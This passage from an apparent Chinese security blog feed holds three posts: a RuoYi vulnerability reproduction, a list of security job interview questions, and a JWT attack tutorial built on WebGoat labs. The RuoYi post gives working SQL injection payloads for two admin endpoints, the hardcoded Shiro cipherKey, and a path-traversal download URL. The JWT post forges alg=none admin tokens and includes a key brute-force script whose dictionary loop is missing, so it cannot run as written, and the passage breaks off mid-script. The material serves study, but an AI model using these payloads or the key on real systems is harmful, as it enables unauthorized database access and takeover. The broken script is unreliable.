id="后台Sql报错注入"><a href="#后台Sql报错注入" class="headerlink" title="后台Sql报错注入"></a>后台Sql报错注入</h2><h3 id="复现-2"><a href="#复现-2" class="headerlink" title="复现"></a>复现</h3><p>分析<a href="https://tttang.com/archive/1712/#toc_0x2-ruoyi-461-sql">https://tttang.com/archive/1712/#toc_0x2-ruoyi-461-sql</a></p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/system/role/list</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"></span><br><span class="line"><span class="language-stylus">params<span class="selector-attr">[dataScope]</span>=and <span class="built_in">extractvalue</span>(<span class="number">1</span>,<span class="built_in">concat</span>(<span class="number">0</span>x7e,(select <span class="built_in">user</span>()),<span class="number">0</span>x7e))</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230621195248659.png" alt="image-20230621195248659"></p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/system/dept/edit</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">DeptName</span>=<span class="number">1</span>&amp;DeptId=<span class="number">100</span>&amp;ParentId=<span class="number">12</span>&amp;Status=<span class="number">0</span>&amp;OrderNum=<span class="number">1</span>&amp;ancestors=<span class="number">0</span>)or(extractvalue(<span class="number">1</span>,concat((select user()))));#</span></span><br></pre></td></tr></table></figure><h2 id="shiro反序列化"><a href="#shiro反序列化" class="headerlink" title="shiro反序列化"></a>shiro反序列化</h2><p>前面提到了若依的核心技术采用<strong>Shiro</strong>，如果密钥泄露了，自然就存在shiro反序列化漏洞。</p><p>默认是动态生成密钥，固定密钥可以在<code>application.yml</code>中配置<code>shiro.cookie.cipherKey</code></p><p><img src="/../images/image-20230621193653154.png" alt="image-20230621193653154"></p><p>V4.3.1~V4.6.1，cipherKey使用硬编码zSyK5Kp6PZAAjlT+eeNMlg&#x3D;&#x3D;</p><p><img src="/../images/image-20230621203731261.png" alt="image-20230621203731261"></p><h3 id="复现-3"><a href="#复现-3" class="headerlink" title="复现"></a>复现</h3><p><img src="/../images/image-20230621202753098.png" alt="image-20230621202753098"></p><h2 id="后台任意文件下载"><a href="#后台任意文件下载" class="headerlink" title="后台任意文件下载"></a>后台任意文件下载</h2><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">/common/download/resource?resource=/profile/../pom.xml</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230825145931666.png" alt="image-20230825145931666"></p><h2 id="利用工具"><a href="#利用工具" class="headerlink" title="利用工具"></a>利用工具</h2><p><img src="/../images/image-20230917181756487.png" alt="image-20230917181756487"></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>笔/面记录</title>
      <link href="/2023/06/21/%E9%9D%A2%E8%AF%95%E8%AE%B0%E5%BD%95/"/>
      <url>/2023/06/21/%E9%9D%A2%E8%AF%95%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h1 id="HW面试"><a href="#HW面试" class="headerlink" title="HW面试"></a>HW面试</h1><blockquote><p>大概是三次面试的集合去了重的，结果还是去了实习</p></blockquote><ul><li><p>自我介绍</p></li><li><p>之前护网主要做什么</p></li><li><p>设备使用</p><p>用过哪些安全设备，具体产商，具体怎么用（语法是什么）</p></li><li><p>负责外网还是内网，有很多误报怎么办</p></li><li><p>如何判断攻击成功</p></li><li><p>sql注入相关</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sql注入原理，方式，防御手段</span><br><span class="line">宽字节注入原理</span><br><span class="line">sql写shell的条件，具体的语句（追问：除了直接写入还有其他方法吗)</span><br><span class="line">sqlmap写shell的参数和原理</span><br><span class="line">使用sqlmap post注入的参数</span><br><span class="line">sql注入绕过waf的方式</span><br><span class="line">sql注入延时注入时，sleep函数被禁用了怎么办</span><br></pre></td></tr></table></figure></li><li><p>渗透测试流程从信息收集开始完整地讲讲</p></li><li><p>xxe有哪些利用方式</p></li><li><p>给你一个场景，thinkphp，可以文件上传，但是有白名单只能上传图片，怎么rce</p></li><li><p>了解过burp的dns功能吗</p><p>追问：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">看过dnslog日志吗</span><br></pre></td></tr></table></figure></li><li><p>讲一下挖矿木马的处置</p><p>追问：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">要用什么命令定位进程所对应的可执行文件</span><br><span class="line">新增用户怎么排查（windows和linux）</span><br><span class="line">用什么命令排查linux的特权用户 </span><br><span class="line">一直杀不掉怎么办（要看哪些文件/目录）</span><br></pre></td></tr></table></figure></li><li><p>java内存马类型</p><p>追问：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">各自原理</span><br><span class="line">冰蝎的木马原理了解过吗</span><br></pre></td></tr></table></figure></li><li><p>渗透中如果机器不出网怎么办</p><p>追问</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">用的什么反向代理</span><br></pre></td></tr></table></figure></li><li><p>如果可以rce，但是无回显并且不出网怎么办</p></li><li><p>如果机子被上了cs木马，怎么检测出木马进程</p></li><li><p>wireshark用过吗</p></li><li><p>假设上传了webshell，攻击者会使用webshell管理工具进行连接，讲一下这些管理工具的流量特征</p></li><li><p>讲一下java的shiro，log4j等漏洞</p></li><li><p>有做过溯源吗，了解的说说</p></li><li><p>简历上说挖掘过逻辑漏洞，现在给你一个登录框，你有什么思路</p></li><li><p>假设有一个存储型xss，怎么进行持久化</p></li><li><p>如果通知机器上出现了一些可疑的文件和目录，怎么进行应急响应</p></li><li><p>讲一下文件上传黑白名单绕过</p><p>追问</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">中间件解析漏洞讲讲</span><br></pre></td></tr></table></figure></li><li><p>主机基线规范讲一下</p></li><li><p>如果护网期间出现了0day该怎么办</p></li><li><p>讲一下内网中的票据</p></li><li><p>windows事件状态码</p></li></ul><h1 id="渗透测试实习"><a href="#渗透测试实习" class="headerlink" title="渗透测试实习"></a>渗透测试实习</h1><ul><li>自我介绍</li><li>讲一下反序列化漏洞</li><li>dnslog了解吗，是在命令有回显还是无回显的时候用</li><li>dnslog和反弹shell有什么区别</li><li>一句话木马和内存马有什么区别</li><li>常见的waf绕过方式</li><li>文件上传讲讲</li><li>逻辑漏洞知道哪些</li><li>未授权访问漏洞你是怎么挖到的</li><li>sql注入你会用到哪些函数</li><li>spring框架漏洞</li><li>阿里的druid了解吗</li><li>docker容器漏洞，在实战中有遇见过吗</li><li>weblogic框架漏洞</li><li>知道哪些CMS</li><li>若依CMS漏洞知道吗</li><li>2022年以后的漏洞知道哪些</li><li>你了解我们公司吗</li><li>你怎么看待加班</li></ul><h1 id="信息安全工程师笔试"><a href="#信息安全工程师笔试" class="headerlink" title="信息安全工程师笔试"></a>信息安全工程师笔试</h1><p>某游戏厂，绝大部分都是数据结构，概率统计，算法？？？</p><h1 id="Web安全工程师笔试"><a href="#Web安全工程师笔试" class="headerlink" title="Web安全工程师笔试"></a>Web安全工程师笔试</h1><ul><li><p>“&#96;”符号（反单引号）在PHP语言以及SQL语言中的作用分别是什么</p></li><li><p>Python语句’int’.__class__的含义是什么，该语句和什么漏洞有关</p></li><li><p>Java中的反射有什么作用</p></li><li><p>Java反序列化的基本原理</p></li><li><p>SSRF漏洞有什么漏洞利用思路？</p></li><li><p>利用XSS漏洞可以达到什么效果？有哪些防御XSS漏洞的手段&#x2F;机制？</p></li><li><p>联合查询注入如何判断表中列的数量（除了使用order by）</p></li><li><p>描述一下SQL二次注入漏洞的原理</p></li><li><p>描述一下PHP反序列化漏洞的原理</p></li><li><p>JWT是什么；Cookie和Session的区别是什么</p></li><li><p>描述一下Shiro550漏洞的原理</p></li><li><p>sqlmap –os-shell参数分别在面对MySQL和MSSQL数据库中执行的原理</p></li><li><p>sqlmap中–technique和–dbms参数的含义是什么</p></li><li><p>nmap使用哪个参数可以做到对目标只探测存活，但不进行端口扫描</p></li><li><p>22、1433、1521、2375、3306、3389、6379、7001端口对应的服务名称分别是什么</p></li><li><p>描述一下Redis未授权访问漏洞的利用方式</p></li><li><p>想通过SQL注入漏洞写shell（被攻击目标是MySQL、Apache、PHP），需要被攻击方满足什么条件？MySQL中，可以写入文件的两条指令分别是什么，这两条指令的区别是什么？</p></li><li><p>凭印象列举几个举世闻名的漏洞名称及其CVE编号</p></li><li><p>对于渗透中常见的中间件、框架或组件，你会用什么工具去对他进行漏洞扫描？(具体到中间件、框架或组件及对应工具的名称)</p></li><li><p>如果发现了网站有任意文件读取漏洞，你接下来有什么测试思路？</p></li><li><p>对于链接demo.do?DATA&#x3D;dWlkPTE2&#x3D;&#x3D;，你有什么测试思路？</p></li><li><p>扫目录发现swagger.json，你有什么测试思路？</p></li><li><p>遇到只有一个登录框页面的网站，你有哪些测试思路</p></li><li><p>描述对手机App（Android&#x2F;IOS）进行测试的思路和做法</p></li><li><p>具体到工具的名称</p></li><li><p>描述对微信小程序进行测试的思路和做法</p></li><li><p>给你单个IP地址，让你对它进行全面的渗透测试，你的思路和做法是什么？（此处写明你会使用到的工具的名称。比如不要只说“使用工具进行漏洞扫描”，具体到：“使用xxx工具进行漏洞扫描” ）</p></li><li><p>获取到边界服务器的权限后，有哪些方法可以快速找出内网中可能存活的主机</p></li><li><p>Windows和Linux使用命令行下载文件的方式分别有哪些？（可以只写命令的名称，不用写全命令完整参数）</p></li><li><p>描述你常用的端口转发及代理隧道的搭建方式</p></li><li><p>xray是哪家公司开发的，是用什么语言编写的？goby是哪家公司开发的，是用什么语言写的？</p></li><li><p>描述一下你的优势 ，以及能为公司创造什么价值</p></li><li><p>请谈一谈你的职业规划</p></li><li><p>请介绍下你的性格</p></li><li><p>请介绍一下你对于网络安全学习的热情</p></li></ul><h1 id="安服-x2F-渗透笔试"><a href="#安服-x2F-渗透笔试" class="headerlink" title="安服&#x2F;渗透笔试"></a>安服&#x2F;渗透笔试</h1><blockquote><p>绿盟80题，其中不定项选择题少选，错选都不得分，10道简答题</p><p>深信服30道选择题</p><p>奇安信40道选择题</p><p>亚信25道选择题，10道简答题</p></blockquote><p><strong>选择题</strong></p><ul><li>Web安全</li><li>应急响应</li><li>Linux</li><li>计算机网络</li><li>Android渗透相关（绿盟）</li><li>密码学相关（绿盟，其他的也有考一点）</li></ul><p><strong>简答题</strong></p><ul><li>内网：信息收集，隧道搭建，内网大体思路</li><li>外网：特定场景下的渗透思路</li><li>个人特点和职业规划（亚信）</li><li>项目实施（亚信）</li><li>Java代码审计（绿盟）</li><li>应急响应思路（绿盟）</li><li>恶意样本分析思路（绿盟）</li></ul><h1 id="安服面试"><a href="#安服面试" class="headerlink" title="安服面试"></a>安服面试</h1><blockquote><p>绿盟要求高，感觉啥都要会，每次都问我入职实习能不能来？？</p><p>深信服没咋问技术型问题，更看重的是你的软实力，比如安全行业认知，学习方法，性格品质等是否匹配</p></blockquote><h2 id="绿盟一面"><a href="#绿盟一面" class="headerlink" title="绿盟一面"></a>绿盟一面</h2><p>30min</p><ul><li>自我介绍</li><li>做过哪些系统</li><li>比较难忘的渗透测试经历或者说学到东西的</li><li>shiro是什么</li><li>shiro权限绕过的原理</li><li>shiro权限校验是怎么做的，看过相关代码吗</li><li>讲讲其他越权</li><li>怎么做权限绕过的修复（面试官还引导了很多，太菜了具体的实现不会）</li><li>常见waf绕过的方式</li><li>文件上传哪一个点可以尝试绕过waf</li><li>APP渗透IOS的接触过嘛</li><li>APP有壳怎么办</li><li>APP测试讲一下，客户端和本地端来讲</li><li>抓包怎么抓的</li><li>HTTP双向认证怎么绕过</li><li>反问</li></ul><h2 id="绿盟二面"><a href="#绿盟二面" class="headerlink" title="绿盟二面"></a>绿盟二面</h2><p>45min</p><ul><li>自我介绍</li><li>渗透实习干了啥</li><li>对金融和能源行业的公司渗透有没有自己的一些心得（回答了后，问你这个是打点吗？）</li><li>内网渗透有实际做过吗（实习生没给分配做😅）</li><li>给你一个系统，你觉得要从哪几个方面进行测试</li><li>谈谈对安全服务的了解（答完面试官说对安全服务的理解太浅了。。）</li><li>SRC有没有比较好的排名</li><li>你这个CTF拿的奖横向对比有点少，是有什么原因吗（不是我就打了一年，大家积极性也不够，我有啥办法😭）</li><li>会代码审计吗，有没有自己审出过0Day</li><li>讲讲挖SRC或者实习时候印象比较深刻的两个洞</li><li>熟悉哪种数据库，讲讲这个数据库sql注入绕过waf的方式</li><li>用python写过什么脚本</li><li>讲讲小程序的渗透</li><li>fastjson了解吗</li><li>fastjson不出网怎么利用</li><li>反问环节</li></ul><h2 id="深信服一面"><a href="#深信服一面" class="headerlink" title="深信服一面"></a>深信服一面</h2><p>线下30min</p><blockquote><p>线下酒店环境不错，不过看到其他岗位群面有点哈人</p><p>安服单面聊的挺开心🤣，记得的就这些</p></blockquote><ul><li>自我介绍</li><li>你在学校里有当过什么职位吗？</li><li>志愿活动中有没有什么让你比较印象深刻的事情</li><li>你有没有想过他们的资金来源是什么呢</li><li>你通过哪些方法来进行学习？</li><li>你除了写博客，还有没有在一些社区投稿文章的</li><li>交换机与路由器是什么</li><li>代码审计你会哪些语言，然后给了几行PHP代码让你现场审计（打过CTF的一眼就会很简单）</li><li>讲一下外网思路（有点忘了，反正是跟红队有关）</li><li>反问环节</li></ul><h2 id="深信服二面"><a href="#深信服二面" class="headerlink" title="深信服二面"></a>深信服二面</h2><p>45min</p><blockquote><p>记不大得</p></blockquote><ul><li><p>自我介绍（讲讲在学校的学习经历和这个实习经历）</p></li><li><p>你是信息安全专业的？</p></li><li><p>为什么要转专业呢？</p></li><li><p>除了兴趣还有什么原因呢？比如说薪酬之类的</p></li><li><p>你有什么职业规划吗？</p></li><li><p>你课余时间会做什么？</p></li><li><p>你在学校或者实习中遇到的最大的困难是什么？</p></li><li><p>如果和别人发生了冲突，你会怎么做？</p></li><li><p>说一下你的优缺点，各说2-3个</p></li><li><p>你通过哪些方法来进行学习？</p></li><li><p>你对我们公司的业务有什么了解吗？</p></li><li><p>反问环节</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 面试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>JWT安全</title>
      <link href="/2023/06/01/JWT%E4%BB%A4%E7%89%8C/"/>
      <url>/2023/06/01/JWT%E4%BB%A4%E7%89%8C/</url>
      
        <content type="html"><![CDATA[<h1 id="JWT认识"><a href="#JWT认识" class="headerlink" title="JWT认识"></a>JWT认识</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>JSON Web Token（JSON Web 令牌）是一种跨域验证身份的方案。JWT 不加密传输的数据，但能够通过数字签名来验证数据未被篡改。</p><h2 id="令牌工作流程"><a href="#令牌工作流程" class="headerlink" title="令牌工作流程"></a>令牌工作流程</h2><p><img src="/../images/jwt-diagram.png" alt="jwt"></p><ol><li>浏览器发起请求登陆</li><li>服务端验证身份，根据算法，将用户标识符打包生成 token, 并且返回给浏览器</li><li>浏览器发起请求获取用户资料，把刚刚拿到的 token 一起发送给服务器</li><li>服务器发现数据中有 token，验证签名并识别用户身份</li><li>服务器返回该用户的用户资料</li></ol><h2 id="组成"><a href="#组成" class="headerlink" title="组成"></a>组成</h2><p>JWT 分为三部分，头部（Header），声明（Claims），签名（Signature），三个部分以英文句号.隔开。 </p><p><img src="/../images/jwt_token.png" alt="JWT"></p><p>hearder和Claims 的内容以 Base64URL 进行了编码。</p><blockquote><p>Base64URL  From 维基百科</p></blockquote><p><img src="/../images/image-20230607163309054.png" alt="image-20230607163309054"></p><h3 id="头部（Header）"><a href="#头部（Header）" class="headerlink" title="头部（Header）"></a>头部（Header）</h3><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;alg&quot;</span><span class="punctuation">:</span><span class="string">&quot;HS256&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;kid&quot;</span><span class="punctuation">:</span><span class="string">&quot;webgoat_key&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;typ&quot;</span><span class="punctuation">:</span><span class="string">&quot;JWT&quot;</span> </span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>参数说明:</p><ul><li>algorithm（alg） :说明JWT签名使用的算法，常见有HS256（默认），RS256 等，也可以为 None不进行签名。</li><li>kid：用来指定验证签名的密钥</li><li>typ:说明这个 token 的类型为 JWT (可选参数)</li></ul><h3 id="声明（Claims）"><a href="#声明（Claims）" class="headerlink" title="声明（Claims）"></a>声明（Claims）</h3><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span> </span><br><span class="line"> <span class="attr">&quot;secretid&quot;</span><span class="punctuation">:</span><span class="string">&quot; &quot;</span></span><br><span class="line"> <span class="attr">&quot;aud&quot;</span><span class="punctuation">:</span> <span class="string">&quot;webgoat.org&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;iat&quot;</span><span class="punctuation">:</span> <span class="number">1644039735</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;exp&quot;</span><span class="punctuation">:</span> <span class="number">1644039795</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;sub&quot;</span><span class="punctuation">:</span> <span class="string">&quot;tom@webgoat.org&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;jti&quot;</span><span class="punctuation">:</span><span class="string">&quot;xxx&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;nbf&quot;</span><span class="punctuation">:</span>xxx</span><br><span class="line"><span class="punctuation">&#125;</span> </span><br></pre></td></tr></table></figure><p>参数说明：</p><ul><li>secretid：密钥id值，当其为空时，jwt默认alg为none</li><li>aud：接收jwt的用户</li><li>iat：令牌生效时间 </li><li>exp：令牌到期时间</li><li>sub：主题</li><li>jti： jwt的唯一身份标识，主要用来作为一次性token,从而回避重放攻击</li><li>nbf：定义在什么时间之前，该jwt都是不可用的.</li></ul><p> 文档：<a href="https://datatracker.ietf.org/doc/html/rfc7519#section-4.1">https://datatracker.ietf.org/doc/html/rfc7519#section-4.1</a></p><h3 id="签名（Signature）"><a href="#签名（Signature）" class="headerlink" title="签名（Signature）"></a>签名（Signature）</h3><p>​服务器有一个不会发送给客户端的密码（secret），用头部中指定的算法对头部和声明的内容（base64编码后的）用此密码进行加密，生成的字符串就是 JWT 的签名。 </p><p>以HMAC SHA256为例</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">HMACSHA256(base64UrlEncode(header) + <span class="string">&quot;.&quot;</span> + base64UrlEncode(claims),secret)</span><br></pre></td></tr></table></figure><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>在http header中添加</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Authorization</span><span class="punctuation">: </span>Bearer &lt;token&gt;</span><br></pre></td></tr></table></figure><h2 id="安全性"><a href="#安全性" class="headerlink" title="安全性"></a>安全性</h2><ul><li><p>防篡改取决于私钥和加密算法的安全性。</p></li><li><p>因为签名所以JWT能够防篡改起到认证功能，但是对于header和Claims部分只进行了base64URL编码，这意味着任何人都可以读取到这部分的信息，所以除非加密，否则不要在JWT的有效负载或报头元素中放置秘密信息。</p></li></ul><h1 id="如何生成JWT"><a href="#如何生成JWT" class="headerlink" title="如何生成JWT"></a>如何生成JWT</h1><ul><li><p>签名解析网站 <a href="https://jwt.io/">JSON Web Tokens - jwt.io</a></p></li><li><p>python</p><p>安装模块</p><p><a href="https://stackoverflow.com/questions/33198428/jwt-module-object-has-no-attribute-encode">https://stackoverflow.com/questions/33198428/jwt-module-object-has-no-attribute-encode</a></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pip uninstall JWT </span><br><span class="line">pip uninstall PyJWT </span><br><span class="line">pip install PyJWT==<span class="number">1.7</span><span class="number">.1</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">key = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 调用jwt库,生成json web token</span></span><br><span class="line">jwt_token = jwt.encode(payload=payload,  <span class="comment"># payload, 有效载体</span></span><br><span class="line">                       key=key,  <span class="comment"># 进行加密签名的密钥</span></span><br><span class="line">                       algorithm=<span class="string">&quot;HS256&quot;</span>,  <span class="comment"># 指明签名算法方式, 默认也是HS256</span></span><br><span class="line">                       headers=headers  <span class="comment"># json web token 数据结构包含两部分, payload(有效载体), headers(标头)</span></span><br><span class="line">                       ).decode(<span class="string">&#x27;ascii&#x27;</span>)  <span class="comment"># python3 编码后得到 bytes, 再进行解码(指明解码的格式), 得到一个str</span></span><br><span class="line"><span class="built_in">print</span>(jwt_token)</span><br></pre></td></tr></table></figure></li></ul><h1 id="JWT检测"><a href="#JWT检测" class="headerlink" title="JWT检测"></a>JWT检测</h1><ul><li><p>JAVAweb</p></li><li><p>数据包请求头</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Authorization</span><span class="punctuation">: </span>Bearer</span><br></pre></td></tr></table></figure></li><li><p>数据包数据格式</p></li></ul><h1 id="攻击手段"><a href="#攻击手段" class="headerlink" title="攻击手段"></a>攻击手段</h1><h3 id="签名算法置None"><a href="#签名算法置None" class="headerlink" title="签名算法置None"></a>签名算法置None</h3><h4 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h4><p>WebGoat JWT 5</p><p><img src="/../images/image-20230607173309475.png" alt="image-20230607173309475"></p><p>点击reset按钮，抓取数据包，将数据包中的token进行解密</p><p><img src="/../images/image-20230607173408930.png" alt="image-20230607173408930"></p><p>发现在声明部分有admin参数值为false，应该就是根据这个来判断用户是否为管理员</p><p><strong>将admin值修改为true</strong></p><p>这时候修改了声明部分的内容，签名就失效了，所以要绕过签名验证</p><p><strong>将头部alg值改为none，让服务器不进行签名验证</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line">token = jwt.encode(</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;iat&quot;</span>: <span class="number">1686993728</span>,</span><br><span class="line">  <span class="string">&quot;admin&quot;</span>: <span class="string">&quot;true&quot;</span>,</span><br><span class="line">  <span class="string">&quot;user&quot;</span>: <span class="string">&quot;Jerry&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">,algorithm=<span class="string">&quot;none&quot;</span>,key=<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(token)</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230607174127468.png" alt="image-20230607174127468"></p><h4 id="形成原因"><a href="#形成原因" class="headerlink" title="形成原因"></a>形成原因</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">   <span class="type">Jwt</span> <span class="variable">jwt</span> <span class="operator">=</span> Jwts.parser().setSigningKey(JWT_PASSWORD).parse(accessToken);</span><br><span class="line">   <span class="type">Claims</span> <span class="variable">claims</span> <span class="operator">=</span> (Claims) jwt.getBody();</span><br><span class="line">   <span class="type">String</span> <span class="variable">user</span> <span class="operator">=</span> (String) claims.get(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">   <span class="type">boolean</span> <span class="variable">isAdmin</span> <span class="operator">=</span> Boolean.valueOf((String) claims.get(<span class="string">&quot;admin&quot;</span>));</span><br><span class="line">   <span class="keyword">if</span> (isAdmin) &#123;</span><br><span class="line">     removeAllUsers();</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">     log.error(<span class="string">&quot;You are not an admin user&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (JwtException e) &#123;</span><br><span class="line">  <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidTokenException</span>(e);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关键点在于</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Jwt</span> <span class="variable">jwt</span> <span class="operator">=</span> Jwts.parser().setSigningKey(JWT_PASSWORD).parse(accessToken);</span><br></pre></td></tr></table></figure><p>使用了错误的函数<code>parse(accessToken)</code>，而不是<code>parseClaimsJws(accessToken)</code>，导致jwt验证成功</p><p>正常情况下</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Jwt</span> <span class="variable">jwt</span> <span class="operator">=</span> Jwts.parser().setSigningKey(JWT_PASSWORD).parseClaimsJws(accessToken);</span><br></pre></td></tr></table></figure><ul><li><code>Jwts.parser()</code> 创建了一个<code>JwtParser</code>类的实例，用于解析和验证JWT。</li><li><code>setSigningKey(JWT_PASSWORD)</code> 设置用于签名JWT的密钥。<code>JWT_PASSWORD</code>变量应包含用于签名JWT的相同密钥。</li><li><code>parseClaimsJws(accessToken)</code> 解析包含在<code>accessToken</code>变量中的JWT，并将其作为<code>Jws&lt;Claims&gt;</code>对象返回。<code>Claims</code>对象包含JWT的有效负载，通常包括关于用户的信息以及授权请求所需的任何其他数据。</li></ul><p>需要注意的是，如果使用提供的密钥无法验证JWT，则<code>parseClaimsJws()</code>方法将抛出<code>SignatureException</code>。</p><h3 id="爆破密钥–修改签名"><a href="#爆破密钥–修改签名" class="headerlink" title="爆破密钥–修改签名"></a>爆破密钥–修改签名</h3><p>WebGoat JWT 10</p><p>工具</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./jwtcrack JWT数据</span><br><span class="line">hashcat</span><br></pre></td></tr></table></figure><p>python脚本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    1.若签名直接校验成功，则 key_ 为有效密钥；</span></span><br><span class="line"><span class="string">    2.若因数据部分预定义字段错误（jwt.exceptions.ExpiredSignatureError, jwt.exceptions.InvalidAudienceError, jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.ImmatureSignatureError）导致校验失败，说明并非密钥错误导致，则 key_ 也为有效密钥；</span></span><br><span class="line"><span class="string">    3.若因密钥错误（jwt.exceptions.InvalidSignatureError）导致校验失败，则 key_ 为无效密钥；</span></span><br><span class="line"><span class="string">    4.若为其他原因（如，JWT 字符串格式错误）导致校验失败，根本无法验证当前 key_ 是否有效。</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="comment">#import termcolor</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment"># 提示里给的字典https://github.com/first20hours/google-10000-english</span></span><br><span class="line">dict_path = <span class="string">&#x27;path/10000_en_words.txt&#x27;</span></span><br><span class="line">JWT_STR = <span class="string">R&#x27;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJpYXQiOjE1MjQyMTA5MDQsImV4cCI6MTYxODkwNTMwNCwiYXVkIjoid2ViZ29hdC5vcmciLCJzdWIiOiJ0b21Ad2ViZ29hdC5jb20iLCJ1c2VybmFtZSI6IlRvbSIsIkVtYWlsIjoidG9tQHdlYmdvYXQuY29tIiwiUm9sZSI6WyJNYW5hZ2VyIiwiUHJvamVjdCBBZG1pbmlzdHJhdG9yIl19.m-jSyfYEsVzD3CBI6N39wZ7AcdKdp_GiO7F_Ym12u-0&#x27;</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    jwt_str = JWT_STR</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(dict_path) <span class="keyword">as</span> f:</span><br><span class="line">            key_ = line.strip()</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                jwt.decode(jwt_str, verify=<span class="literal">True</span>, key=key_)</span><br><span class="line">                <span class="comment">#print(&#x27;\r&#x27;, &#x27;\bbingo! found key --&gt;&#x27;, termcolor.colored(key_, &#x27;green&#x27;), &#x27;&lt;--&#x27;)</span></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;\r&#x27;</span>,<span class="string">&#x27;the key is [&#x27;</span>,key_,<span class="string">&#x27;]&#x27;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span> (jwt.exceptions.ExpiredSignatureError, jwt.exceptions.InvalidAudienceError, jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.ImmatureSignatureError):</span><br><span class="line">                <span class="comment">#print(&#x27;\r&#x27;, &#x27;\bbingo! found key --&gt;&#x27;, termcolor.colored(key_, &#x27;green&#x27;), &#x27;&lt;--&#x27;)</span></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;\r&#x27;</span>,<span class="string">&#x27;the key is [&#x27;</span>,key_,<span class="string">&#x27;]&#x27;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span> jwt.exceptions.InvalidSignatureError:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27; &#x27;</span> * <span class="number">64</span>, <span 